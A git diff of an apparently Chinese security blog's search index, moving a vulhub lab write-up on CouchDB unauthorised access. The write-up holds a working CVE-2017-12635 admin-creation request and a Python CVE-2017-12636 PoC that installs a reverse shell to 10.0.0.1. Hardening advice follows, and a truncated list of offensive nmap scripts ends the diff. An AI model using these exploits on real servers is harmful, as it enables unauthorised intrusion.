@@ -128,67 +128,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Couchdb 未授权访问</title>
-    <url>/2023/05/17/Couchdb/</url>
-    <content><![CDATA[<div class="note red icon-padding flat"><i class="note-icon fas fa-fan"></i><p>奇奇怪怪</p>
-</div>
-
-<div class="note orange icon-padding flat"><i class="note-icon fas fa-battery-half"></i><p>安全小技巧</p>
-</div>
-
-<div class="note blue icon-padding flat"><i class="note-icon fas fa-bullhorn"></i><p>新的一天开始了</p>
-</div>
-
-<div class="note purple icon-padding flat"><i class="note-icon far fa-hand-scissors"></i><p>剪刀石头布,哈，我又赢了 </p>
-</div>
-
-<div class="timeline purple"><div class='timeline-item headline'><div class='timeline-item-title'><div class='item-circle'><p>2023</p>
-</div></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>05-17</p>
-</div></div><div class='timeline-item-content'><h1 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h1><p>Apache CouchDB是一个开源数据库，专注于易用性和成为”完全拥抱web的数据库”。它是一个使用JSON作为存储格式，JavaScript作为查询语言，MapReduce和HTTP作为API的NoSQL数据库。应用广泛，如BBC用在其动态内容展示平台，Credit Suisse用在其内部的商品部门的市场框架，Meebo，用在其社交平台（web和应用程序）。</p>
-<p>CouchDB 默认在 5984 端口开放 Restful 的 API 接口，用于数据库的管理功能。其 HTTP Server 默认开启时没有进行验证，而且绑定在0.0.0.0，所有用户均可通过 API 访问导致未授权访问。任何连接到服务器端口上的人，都可以调用相关 API 对服务器上的数据进行任意的增删改查，其中通过 API 修改 local.ini 配置文件，可进一步导致执行任意系统命令，获取服务器权限！</p>
-<h1 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h1><p>使用 vulhub 搭建</p>
-<p>启动完成后，访问<code>http://your-ip:5984/</code>即可看到Couchdb的欢迎页面。</p>
-<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><h3 id="Couchdb-垂直权限绕过漏洞（CVE-2017-12635）"><a href="#Couchdb-垂直权限绕过漏洞（CVE-2017-12635）" class="headerlink" title="Couchdb 垂直权限绕过漏洞（CVE-2017-12635）"></a><strong>Couchdb 垂直权限绕过漏洞（CVE-2017-12635）</strong></h3><p>任意用户创建</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">数据包中发送两个 roles 数据包，可绕过限制，建立用户</span><br><span class="line">PUT /_users/org.couchdb.user:vulhub HTTP/1.1</span><br><span class="line">Host: your-ip:5984</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 108</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;type&quot;</span>: <span class="string">&quot;user&quot;</span>,</span><br><span class="line">  <span class="string">&quot;name&quot;</span>: <span class="string">&quot;vulhub&quot;</span>,</span><br><span class="line">  <span class="string">&quot;roles&quot;</span>: [<span class="string">&quot;_admin&quot;</span>],</span><br><span class="line">  <span class="string">&quot;roles&quot;</span>: [],</span><br><span class="line">  <span class="string">&quot;password&quot;</span>: <span class="string">&quot;vulhub&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="Couchdb-任意命令执行漏洞（CVE-2017-12636）"><a href="#Couchdb-任意命令执行漏洞（CVE-2017-12636）" class="headerlink" title="Couchdb 任意命令执行漏洞（CVE-2017-12636）"></a><strong>Couchdb 任意命令执行漏洞（CVE-2017-12636）</strong></h3><p>在2017年11月15日，CVE-2017-12635和CVE-2017-12636披露，CVE-2017-12636是一个任意命令执行漏洞，我们可以通过config api修改couchdb的配置<code>query_server</code>，这个配置项在设计、执行view的时候将被运行。</p>
-<p><strong>利用条件</strong></p>
-<p>影响版本：小于 1.7.0 以及 小于 2.1.1</p>
-<p>该漏洞是需要登录用户方可触发，如果不知道目标管理员密码，可以利用<a href="https://github.com/vulhub/vulhub/tree/master/couchdb/CVE-2017-12635">CVE-2017-12635</a>先增加一个管理员用户。</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">利用方式</span><br><span class="line">使用msf模块：linux/http/apache_couchdb_cmd_exec</span><br><span class="line"></span><br><span class="line">poc 代码</span><br><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line">import requests</span><br><span class="line">import json</span><br><span class="line">import <span class="built_in">base64</span></span><br><span class="line">from requests.auth import HTTPBasicAuth</span><br><span class="line"></span><br><span class="line">target = <span class="string">&#x27;http://your-ip/:5984&#x27;</span></span><br><span class="line"><span class="built_in">command</span> = rb<span class="string">&quot;&quot;</span><span class="string">&quot;sh -i &gt;&amp; /dev/tcp/10.0.0.1/443 0&gt;&amp;1&quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">version = 1</span><br><span class="line"></span><br><span class="line">session = requests.session()</span><br><span class="line">session.headers = &#123;</span><br><span class="line">    <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># session.proxies = &#123;</span></span><br><span class="line"><span class="comment">#     &#x27;http&#x27;: &#x27;http://127.0.0.1:8085&#x27;</span></span><br><span class="line"><span class="comment"># &#125;</span></span><br><span class="line">session.put(target + <span class="string">&#x27;/_users/org.couchdb.user:wooyun&#x27;</span>, data=<span class="string">&#x27;&#x27;</span><span class="string">&#x27;&#123;</span></span><br><span class="line"><span class="string">  &quot;type&quot;: &quot;user&quot;,</span></span><br><span class="line"><span class="string">  &quot;name&quot;: &quot;wooyun&quot;,</span></span><br><span class="line"><span class="string">  &quot;roles&quot;: [&quot;_admin&quot;],</span></span><br><span class="line"><span class="string">  &quot;roles&quot;: [],</span></span><br><span class="line"><span class="string">  &quot;password&quot;: &quot;wooyun&quot;</span></span><br><span class="line"><span class="string">&#125;&#x27;</span><span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">session.auth = HTTPBasicAuth(<span class="string">&#x27;wooyun&#x27;</span>, <span class="string">&#x27;wooyun&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">command</span> = <span class="string">&quot;bash -c &#x27;&#123;echo,%s&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;&quot;</span> % base64.b64encode(<span class="built_in">command</span>).decode()</span><br><span class="line"><span class="keyword">if</span> version == 1:</span><br><span class="line">    session.put(target + (<span class="string">&#x27;/_config/query_servers/cmd&#x27;</span>), data=json.dumps(<span class="built_in">command</span>))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    host = session.get(target + <span class="string">&#x27;/_membership&#x27;</span>).json()[<span class="string">&#x27;all_nodes&#x27;</span>][0]</span><br><span class="line">    session.put(target + <span class="string">&#x27;/_node/&#123;&#125;/_config/query_servers/cmd&#x27;</span>.format(host), data=json.dumps(<span class="built_in">command</span>))</span><br><span class="line"></span><br><span class="line">session.put(target + <span class="string">&#x27;/wooyun&#x27;</span>)</span><br><span class="line">session.put(target + <span class="string">&#x27;/wooyun/test&#x27;</span>, data=<span class="string">&#x27;&#123;&quot;_id&quot;: &quot;wooyuntest&quot;&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> version == 1:</span><br><span class="line">    session.post(target + <span class="string">&#x27;/wooyun/_temp_view?limit=10&#x27;</span>, data=<span class="string">&#x27;&#123;&quot;language&quot;:&quot;cmd&quot;,&quot;map&quot;:&quot;&quot;&#125;&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    session.put(target + <span class="string">&#x27;/wooyun/_design/test&#x27;</span>, data=<span class="string">&#x27;&#123;&quot;_id&quot;:&quot;_design/test&quot;,&quot;views&quot;:&#123;&quot;wooyun&quot;:&#123;&quot;map&quot;:&quot;&quot;&#125; &#125;,&quot;language&quot;:&quot;cmd&quot;&#125;&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h1 id="漏洞加固"><a href="#漏洞加固" class="headerlink" title="漏洞加固"></a>漏洞加固</h1><ul>
-<li>指定CouchDB绑定的IP （需要重启CouchDB才能生效） 在 &#x2F;etc&#x2F;couchdb&#x2F;local.ini 文件中找到 “bind_address &#x3D; 0.0.0.0” ，把 0.0.0.0 修改为 127.0.0.1 ，然后保存。注：修改后只有本机才能访问CouchDB。</li>
-<li>设置访问密码 （需要重启CouchDB才能生效） 在 &#x2F;etc&#x2F;couchdb&#x2F;local.ini 中找到“[admins]”字段配置密码</li>
-</ul>
-<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><ul>
-<li><a href="https://paper.seebug.org/409/#0x09-couchdb">https://paper.seebug.org/409/#0x09-couchdb</a></li>
-<li><a href="https://vulhub.org/#/environments/couchdb/CVE-2017-12636/">https://vulhub.org/#/environments/couchdb/CVE-2017-12636/</a></li>
-</ul>
-</div></div></div>
-
-<div class="note red icon-padding modern"><i class="note-icon fas fa-fan"></i><p>啊，再见了，再见了，哈</p>
-</div>
-
-<div class="note orange icon-padding modern"><i class="note-icon fas fa-battery-half"></i><p>我们会再见的对么</p>
-</div>
-
-<div class="note blue icon-padding modern"><i class="note-icon fas fa-bullhorn"></i><p>再见你要幸福</p>
-</div>
-
-<div class="note purple icon-padding modern"><i class="note-icon far fa-hand-scissors"></i><p>燕子，燕子</p>
-</div>
-
-]]></content>
-      <categories>
-        <category>未授权访问</category>
-        <category>Couchdb</category>
-      </categories>
-      <tags>
-        <tag>Couchdb</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Docker 未授权访问</title>
     <url>/2023/05/18/Docker/</url>
     <content><![CDATA[<div class="note red icon-padding flat"><i class="note-icon fas fa-fan"></i><p>奇奇怪怪</p>
@@ -255,6 +194,67 @@
       </categories>
       <tags>
         <tag>Docker</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Couchdb 未授权访问</title>
+    <url>/2023/05/17/Couchdb/</url>
+    <content><![CDATA[<div class="note red icon-padding flat"><i class="note-icon fas fa-fan"></i><p>奇奇怪怪</p>
+</div>
+
+<div class="note orange icon-padding flat"><i class="note-icon fas fa-battery-half"></i><p>安全小技巧</p>
+</div>
+
+<div class="note blue icon-padding flat"><i class="note-icon fas fa-bullhorn"></i><p>新的一天开始了</p>
+</div>
+
+<div class="note purple icon-padding flat"><i class="note-icon far fa-hand-scissors"></i><p>剪刀石头布,哈，我又赢了 </p>
+</div>
+
+<div class="timeline purple"><div class='timeline-item headline'><div class='timeline-item-title'><div class='item-circle'><p>2023</p>
+</div></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>05-17</p>
+</div></div><div class='timeline-item-content'><h1 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h1><p>Apache CouchDB是一个开源数据库，专注于易用性和成为”完全拥抱web的数据库”。它是一个使用JSON作为存储格式，JavaScript作为查询语言，MapReduce和HTTP作为API的NoSQL数据库。应用广泛，如BBC用在其动态内容展示平台，Credit Suisse用在其内部的商品部门的市场框架，Meebo，用在其社交平台（web和应用程序）。</p>
+<p>CouchDB 默认在 5984 端口开放 Restful 的 API 接口，用于数据库的管理功能。其 HTTP Server 默认开启时没有进行验证，而且绑定在0.0.0.0，所有用户均可通过 API 访问导致未授权访问。任何连接到服务器端口上的人，都可以调用相关 API 对服务器上的数据进行任意的增删改查，其中通过 API 修改 local.ini 配置文件，可进一步导致执行任意系统命令，获取服务器权限！</p>
+<h1 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h1><p>使用 vulhub 搭建</p>
+<p>启动完成后，访问<code>http://your-ip:5984/</code>即可看到Couchdb的欢迎页面。</p>
+<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><h3 id="Couchdb-垂直权限绕过漏洞（CVE-2017-12635）"><a href="#Couchdb-垂直权限绕过漏洞（CVE-2017-12635）" class="headerlink" title="Couchdb 垂直权限绕过漏洞（CVE-2017-12635）"></a><strong>Couchdb 垂直权限绕过漏洞（CVE-2017-12635）</strong></h3><p>任意用户创建</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">数据包中发送两个 roles 数据包，可绕过限制，建立用户</span><br><span class="line">PUT /_users/org.couchdb.user:vulhub HTTP/1.1</span><br><span class="line">Host: your-ip:5984</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 108</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;type&quot;</span>: <span class="string">&quot;user&quot;</span>,</span><br><span class="line">  <span class="string">&quot;name&quot;</span>: <span class="string">&quot;vulhub&quot;</span>,</span><br><span class="line">  <span class="string">&quot;roles&quot;</span>: [<span class="string">&quot;_admin&quot;</span>],</span><br><span class="line">  <span class="string">&quot;roles&quot;</span>: [],</span><br><span class="line">  <span class="string">&quot;password&quot;</span>: <span class="string">&quot;vulhub&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Couchdb-任意命令执行漏洞（CVE-2017-12636）"><a href="#Couchdb-任意命令执行漏洞（CVE-2017-12636）" class="headerlink" title="Couchdb 任意命令执行漏洞（CVE-2017-12636）"></a><strong>Couchdb 任意命令执行漏洞（CVE-2017-12636）</strong></h3><p>在2017年11月15日，CVE-2017-12635和CVE-2017-12636披露，CVE-2017-12636是一个任意命令执行漏洞，我们可以通过config api修改couchdb的配置<code>query_server</code>，这个配置项在设计、执行view的时候将被运行。</p>
+<p><strong>利用条件</strong></p>
+<p>影响版本：小于 1.7.0 以及 小于 2.1.1</p>
+<p>该漏洞是需要登录用户方可触发，如果不知道目标管理员密码，可以利用<a href="https://github.com/vulhub/vulhub/tree/master/couchdb/CVE-2017-12635">CVE-2017-12635</a>先增加一个管理员用户。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">利用方式</span><br><span class="line">使用msf模块：linux/http/apache_couchdb_cmd_exec</span><br><span class="line"></span><br><span class="line">poc 代码</span><br><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line">import requests</span><br><span class="line">import json</span><br><span class="line">import <span class="built_in">base64</span></span><br><span class="line">from requests.auth import HTTPBasicAuth</span><br><span class="line"></span><br><span class="line">target = <span class="string">&#x27;http://your-ip/:5984&#x27;</span></span><br><span class="line"><span class="built_in">command</span> = rb<span class="string">&quot;&quot;</span><span class="string">&quot;sh -i &gt;&amp; /dev/tcp/10.0.0.1/443 0&gt;&amp;1&quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">version = 1</span><br><span class="line"></span><br><span class="line">session = requests.session()</span><br><span class="line">session.headers = &#123;</span><br><span class="line">    <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># session.proxies = &#123;</span></span><br><span class="line"><span class="comment">#     &#x27;http&#x27;: &#x27;http://127.0.0.1:8085&#x27;</span></span><br><span class="line"><span class="comment"># &#125;</span></span><br><span class="line">session.put(target + <span class="string">&#x27;/_users/org.couchdb.user:wooyun&#x27;</span>, data=<span class="string">&#x27;&#x27;</span><span class="string">&#x27;&#123;</span></span><br><span class="line"><span class="string">  &quot;type&quot;: &quot;user&quot;,</span></span><br><span class="line"><span class="string">  &quot;name&quot;: &quot;wooyun&quot;,</span></span><br><span class="line"><span class="string">  &quot;roles&quot;: [&quot;_admin&quot;],</span></span><br><span class="line"><span class="string">  &quot;roles&quot;: [],</span></span><br><span class="line"><span class="string">  &quot;password&quot;: &quot;wooyun&quot;</span></span><br><span class="line"><span class="string">&#125;&#x27;</span><span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">session.auth = HTTPBasicAuth(<span class="string">&#x27;wooyun&#x27;</span>, <span class="string">&#x27;wooyun&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">command</span> = <span class="string">&quot;bash -c &#x27;&#123;echo,%s&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;&quot;</span> % base64.b64encode(<span class="built_in">command</span>).decode()</span><br><span class="line"><span class="keyword">if</span> version == 1:</span><br><span class="line">    session.put(target + (<span class="string">&#x27;/_config/query_servers/cmd&#x27;</span>), data=json.dumps(<span class="built_in">command</span>))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    host = session.get(target + <span class="string">&#x27;/_membership&#x27;</span>).json()[<span class="string">&#x27;all_nodes&#x27;</span>][0]</span><br><span class="line">    session.put(target + <span class="string">&#x27;/_node/&#123;&#125;/_config/query_servers/cmd&#x27;</span>.format(host), data=json.dumps(<span class="built_in">command</span>))</span><br><span class="line"></span><br><span class="line">session.put(target + <span class="string">&#x27;/wooyun&#x27;</span>)</span><br><span class="line">session.put(target + <span class="string">&#x27;/wooyun/test&#x27;</span>, data=<span class="string">&#x27;&#123;&quot;_id&quot;: &quot;wooyuntest&quot;&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> version == 1:</span><br><span class="line">    session.post(target + <span class="string">&#x27;/wooyun/_temp_view?limit=10&#x27;</span>, data=<span class="string">&#x27;&#123;&quot;language&quot;:&quot;cmd&quot;,&quot;map&quot;:&quot;&quot;&#125;&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    session.put(target + <span class="string">&#x27;/wooyun/_design/test&#x27;</span>, data=<span class="string">&#x27;&#123;&quot;_id&quot;:&quot;_design/test&quot;,&quot;views&quot;:&#123;&quot;wooyun&quot;:&#123;&quot;map&quot;:&quot;&quot;&#125; &#125;,&quot;language&quot;:&quot;cmd&quot;&#125;&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h1 id="漏洞加固"><a href="#漏洞加固" class="headerlink" title="漏洞加固"></a>漏洞加固</h1><ul>
+<li>指定CouchDB绑定的IP （需要重启CouchDB才能生效） 在 &#x2F;etc&#x2F;couchdb&#x2F;local.ini 文件中找到 “bind_address &#x3D; 0.0.0.0” ，把 0.0.0.0 修改为 127.0.0.1 ，然后保存。注：修改后只有本机才能访问CouchDB。</li>
+<li>设置访问密码 （需要重启CouchDB才能生效） 在 &#x2F;etc&#x2F;couchdb&#x2F;local.ini 中找到“[admins]”字段配置密码</li>
+</ul>
+<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><ul>
+<li><a href="https://paper.seebug.org/409/#0x09-couchdb">https://paper.seebug.org/409/#0x09-couchdb</a></li>
+<li><a href="https://vulhub.org/#/environments/couchdb/CVE-2017-12636/">https://vulhub.org/#/environments/couchdb/CVE-2017-12636/</a></li>
+</ul>
+</div></div></div>
+
+<div class="note red icon-padding modern"><i class="note-icon fas fa-fan"></i><p>啊，再见了，再见了，哈</p>
+</div>
+
+<div class="note orange icon-padding modern"><i class="note-icon fas fa-battery-half"></i><p>我们会再见的对么</p>
+</div>
+
+<div class="note blue icon-padding modern"><i class="note-icon fas fa-bullhorn"></i><p>再见你要幸福</p>
+</div>
+
+<div class="note purple icon-padding modern"><i class="note-icon far fa-hand-scissors"></i><p>燕子，燕子</p>
+</div>
+
+]]></content>
+      <categories>
+        <category>未授权访问</category>
+        <category>Couchdb</category>
+      </categories>
+      <tags>
+        <tag>Couchdb</tag>
       </tags>
   </entry>
   <entry>
@@ -784,7 +784,7 @@
 
 <figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">**实用脚本集合</span><br><span class="line">通过查询<span class="attr">http</span>:<span class="comment">//ip.robtex.com/上的在线Robtex服务，发现解析为目标IP地址的主机名。</span></span><br><span class="line">nmap --script hostmap-robtex -sn -<span class="title class_">Pn</span> scanme.<span class="property">nmap</span>.<span class="property">org</span></span><br><span class="line"></span><br><span class="line">搜索网站并尝试识别已发现文件的备份副本。它通过请求一些不同的文件名组合（例如，index.<span class="property">bak</span>、index.<span class="property">html</span>~、index.<span class="property">html</span>的副本）。</span><br><span class="line">nmap --script=http-backup-finder &lt;target&gt;</span><br><span class="line"></span><br><span class="line">对http basic、digest和ntlm身份验证执行强力密码审核。</span><br><span class="line">nmap --script http-brute -p <span class="number">80</span> &lt;host&gt;</span><br><span class="line"></span><br><span class="line">从<span class="variable constant_">HTTP</span>响应中提取并输出<span class="variable constant_">HTML</span>和<span class="title class_">JavaScript</span>注释。</span><br><span class="line">nmap -p80 --script http-comments-displayer.<span class="property">nse</span> &lt;host&gt;</span><br><span class="line"></span><br><span class="line">检查通用内容管理系统和<span class="title class_">Web</span>服务器配置文件的备份和交换文件。</span><br><span class="line">nmap --script=http-config-backup &lt;target&gt;</span><br><span class="line"></span><br><span class="line">使用各种<span class="title class_">Web</span>应用程序和设备使用的默认凭据测试访问。</span><br><span class="line">nmap -p80 --script http-<span class="keyword">default</span>-accounts host/ip</span><br><span class="line"></span><br><span class="line">通过将<span class="title class_">User</span>-<span class="title class_">Agent</span>更改为“secret”值来检测某些D-<span class="title class_">Link</span>路由器上的固件后门。使用“秘密”<span class="title class_">User</span>-<span class="title class_">Agent</span>绕过身份验证，并允许管理员访问路由器。</span><br><span class="line">nmap -sV --script http-dlink-backdoor &lt;target&gt;</span><br><span class="line"></span><br><span class="line">枚举流行的<span class="title class_">Web</span>应用程序和服务器使用的目录。</span><br><span class="line">nmap -sV --script=http-enum &lt;target&gt;</span><br><span class="line"></span><br><span class="line">利用<span class="title class_">Web</span>应用程序中不安全的文件上传表单，使用各种技术，如更改<span class="title class_">Content</span>-type头或创建包含注释中有效负载的有效图像文件。</span><br><span class="line">nmap -p80 --script http-fileupload-exploiter.<span class="property">nse</span> &lt;target&gt;</span><br><span class="line"></span><br><span class="line">对基于http表单的身份验证执行强力密码审核。</span><br><span class="line">nmap --script http-form-brute -p <span class="number">80</span> &lt;host&gt;</span><br><span class="line"></span><br><span class="line">尝试通过执行<span class="variable constant_">HTTP</span>谓词篡改绕过密码保护的资源（<span class="variable constant_">HTTP</span> <span class="number">401</span>状态）。如果未设置要检查的路径数组，它将爬网<span class="title class_">Web</span>服务器，并对找到的任何受密码保护的资源执行检查。</span><br><span class="line">nmap -sV --script http-method-tamper &lt;target&gt;</span><br><span class="line">nmap -p80 --script http-method-tamper --script-args <span class="string">&#x27;http-method-tamper.paths=&#123;/protected/db.php,/protected/index.php&#125;&#x27;</span> &lt;target&gt;</span><br><span class="line"></span><br><span class="line">通过尝试检索 /etc/passwd 或 \boot.<span class="property">ini</span> 来检查<span class="title class_">Web</span>服务器是否容易受到目录遍历的攻击。</span><br><span class="line">nmap --script http-passwd --script-args http-passwd.<span class="property">root</span>=<span class="regexp">/test/</span> &lt;target&gt;</span><br><span class="line"></span><br><span class="line">在<span class="variable constant_">HTTP</span>服务器上搜索包含易受<span class="variable constant_">SQL</span>注入攻击的查询的<span class="variable constant_">URL</span>。它还从找到的网站中提取表单，并试图识别易受攻击的字段。</span><br><span class="line">nmap -sV --script=http-sql-injection &lt;target&gt;</span><br><span class="line"></span><br><span class="line">利用多个<span class="variable constant_">TP</span>-<span class="title class_">Link</span>无线路由器中存在的目录遍历漏洞进行攻击。攻击者可以利用此漏洞远程读取任何配置和密码文件，而无需进行身份验证。</span><br><span class="line">nmap -p80 --script http-tplink-dir-traversal.<span class="property">nse</span> &lt;target&gt;</span><br><span class="line">nmap -p80 -<span class="title class_">Pn</span> -n --script http-tplink-dir-traversal.<span class="property">nse</span> &lt;target&gt;</span><br><span class="line">nmap -p80 --script http-tplink-dir-traversal.<span class="property">nse</span> --script-args rfile=<span class="regexp">/etc/</span>topology.<span class="property">conf</span> -d -n -<span class="title class_">Pn</span> &lt;target&gt;</span><br><span class="line"></span><br><span class="line">尝试检测<span class="title class_">Wordpress</span> <span class="number">4.7</span><span class="number">.0</span>和<span class="number">4.7</span><span class="number">.1</span>中的权限提升漏洞，该漏洞允许未经身份验证的用户在帖子中注入内容。</span><br><span class="line">nmap --script http-vuln-cve2017-<span class="number">1001000</span> --script-args http-vuln-cve2017-<span class="number">1001000</span>=<span class="string">&quot;uri&quot;</span> &lt;target&gt;</span><br><span class="line">nmap --script http-vuln-cve2017-<span class="number">1001000</span> &lt;target&gt;</span><br><span class="line"></span><br><span class="line">检测指定的<span class="variable constant_">URL</span>是否容易受到<span class="title class_">Apache</span> <span class="title class_">Struts</span>远程代码执行漏洞（<span class="variable constant_">CVE</span>-<span class="number">2017</span>-<span class="number">5638</span>）的攻击。</span><br><span class="line">nmap -p &lt;port&gt; --script http-vuln-cve2017-<span class="number">5638</span> &lt;target&gt;</span><br><span class="line"></span><br><span class="line">检测采用英特尔主动管理技术的系统是否容易受到<span class="variable constant_">INTEL</span>-<span class="variable constant_">SA</span>-<span class="number">00075</span>权限提升漏洞（<span class="variable constant_">CVE</span> <span class="number">2017</span> -<span class="number">5689</span>）的攻击。</span><br><span class="line">nmap -p <span class="number">16992</span> --script http-vuln-cve2017-<span class="number">5689</span> &lt;target&gt;</span><br><span class="line"></span><br><span class="line">通过使用恶意负载探测<span class="title class_">Web</span>服务器并检测响应代码和正文中的更改，尝试确定<span class="title class_">Web</span>服务器是否受<span class="variable constant_">IPS</span>（入侵防御系统）、<span class="variable constant_">IDS</span>（入侵检测系统）或<span class="variable constant_">WAF</span>（<span class="title class_">Web</span>应用程序防火墙）保护。</span><br><span class="line">nmap -p80 --script http-waf-detect &lt;host&gt;</span><br><span class="line">nmap -p80 --script http-waf-detect --script-args=<span class="string">&quot;http-waf-detect.aggro,http-waf-detect.uri=/testphp.vulnweb.com/artists.php&quot;</span> www.<span class="property">modsecurity</span>.<span class="property">org</span></span><br><span class="line"></span><br><span class="line">尝试检测<span class="title class_">Web</span>应用程序防火墙的存在及其类型和版本。</span><br><span class="line">nmap --script=http-waf-fingerprint &lt;targets&gt;</span><br><span class="line">nmap --script=http-waf-fingerprint --script-args http-waf-fingerprint.<span class="property">intensive</span>=<span class="number">1</span> &lt;targets&gt;</span><br><span class="line"></span><br><span class="line">试图利用java的远程调试端口。当远程调试端口保持打开状态时，可以注入java字节码，实现远程代码执行。这个脚本滥用这个特性来注入和执行一个<span class="title class_">Java</span>类文件，这个文件执行提供的shell命令并返回它的输出。</span><br><span class="line">nmap -sT &lt;target&gt; -p &lt;port&gt; --script=+jdwp-exec --script-args cmd=<span class="string">&quot;date&quot;</span></span><br><span class="line"></span><br><span class="line">试图利用java的远程调试端口。当远程调试端口保持打开状态时，可以注入java字节码，实现远程代码执行。这个脚本注入并执行一个返回远程系统信息的<span class="title class_">Java</span>类文件。</span><br><span class="line">nmap -sT &lt;target&gt; -p &lt;port&gt; --script=+jdwp-info</span><br><span class="line"></span><br><span class="line">试图利用java的远程调试端口。当远程调试端口保持打开状态时，可以注入java字节码，实现远程代码执行。此脚本允许注入任意类文件。</span><br><span class="line">nmap -sT &lt;target&gt; -p &lt;port&gt; --script=+jdwp-inject --script-args filename=<span class="title class_">HelloWorld</span>.<span class="property">class</span></span><br><span class="line"></span><br><span class="line">尝试强制<span class="variable constant_">LDAP</span>身份验证。默认情况下，它使用内置的用户名和密码列表。为了使用您自己的列表，请使用 userdb 和 passdb 脚本参数。</span><br><span class="line">nmap -p <span class="number">389</span> --script ldap-brute --script-args ldap.<span class="property">base</span>=<span class="string">&#x27;&quot;cn=users,dc=cqure,dc=net&quot;&#x27;</span> &lt;host&gt;</span><br><span class="line"></span><br><span class="line">对<span class="title class_">MySQL</span>执行密码猜测。</span><br><span class="line">nmap --script=mysql-brute &lt;target&gt;</span><br><span class="line"></span><br><span class="line">尝试列出<span class="title class_">MySQL</span>服务器上的所有数据库。</span><br><span class="line">nmap -sV --script=mysql-databases &lt;target&gt;</span><br><span class="line"></span><br><span class="line">尝试列出<span class="title class_">MySQL</span>服务器上的所有用户。</span><br><span class="line">nmap -sV --script=mysql-users &lt;target&gt;</span><br><span class="line"></span><br><span class="line">检测易受远程代码执行漏洞（称为<span class="variable constant_">MS</span> <span class="number">08</span> -<span class="number">067</span>）攻击的<span class="title class_">Microsoft</span> <span class="title class_">Windows</span>系统。这种检查是危险的，它可能会使系统崩溃。</span><br><span class="line">nmap --script smb-vuln-ms08-<span class="number">067</span>.<span class="property">nse</span> -p445 &lt;host&gt;</span><br><span class="line">nmap -sU --script smb-vuln-ms08-<span class="number">067</span>.<span class="property">nse</span> -p <span class="attr">U</span>:<span class="number">137</span> &lt;host&gt;</span><br><span class="line"></span><br><span class="line">尝试检测<span class="title class_">Microsoft</span> <span class="title class_">SMBv</span> <span class="number">1</span>服务器是否易受远程代码执行漏洞（ms <span class="number">17</span> -<span class="number">010</span>，即<span class="title class_">EternalBlue</span>）。该漏洞被<span class="title class_">WannaCry</span>和<span class="title class_">Petya</span>勒索软件以及其他恶意软件积极利用。</span><br><span class="line">nmap -p445 --script smb-vuln-ms17-<span class="number">010</span> &lt;target&gt;</span><br><span class="line">nmap -p445 --script vuln &lt;target&gt;</span><br><span class="line"></span><br><span class="line">对ssh服务器执行暴力密码猜测。</span><br><span class="line">nmap -p <span class="number">22</span> --script ssh-brute --script-args userdb=users.<span class="property">lst</span>,passdb=pass.<span class="property">lst</span> \</span><br><span class="line">      --script-args ssh-brute.<span class="property">timeout</span>=4s &lt;target&gt;</span><br><span class="line"></span><br><span class="line">对<span class="variable 